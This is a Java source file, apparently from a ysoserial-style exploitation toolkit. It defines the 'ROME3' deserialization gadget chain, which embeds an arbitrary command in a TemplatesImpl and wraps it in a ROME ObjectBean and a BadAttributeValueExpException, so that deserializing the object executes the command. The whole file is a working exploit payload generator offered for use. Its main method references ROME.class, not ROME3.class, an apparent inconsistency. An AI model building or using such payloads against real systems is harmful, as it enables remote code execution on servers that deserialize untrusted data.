package com.h2tg.ysogate.payloads.gadgets;


import com.h2tg.ysogate.utils.PayloadRunner;
import com.sun.syndication.feed.impl.ObjectBean;
import com.h2tg.ysogate.payloads.CommandObjectPayload;
import com.h2tg.ysogate.annotation.Authors;
import com.h2tg.ysogate.annotation.Dependencies;
import com.h2tg.ysogate.utils.Gadgets;
import com.h2tg.ysogate.utils.Reflections;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;


/**
 * JDK 8+
 */
@Dependencies("rome:rome:1.0")
@Authors({"Firebasky"})
public class ROME3 implements CommandObjectPayload<Object>
{

	public Object getObject(String command) throws Exception {
		Object                        o        = Gadgets.createTemplatesImpl(command);
		ObjectBean                    delegate = new ObjectBean(Templates.class, o);
		BadAttributeValueExpException b        = new BadAttributeValueExpException("");
		Reflections.setFieldValue(b, "val", delegate);
		return b;
	}

	public static void main ( final String[] args ) throws Exception {
		PayloadRunner.run(ROME.class, args);
	}
}
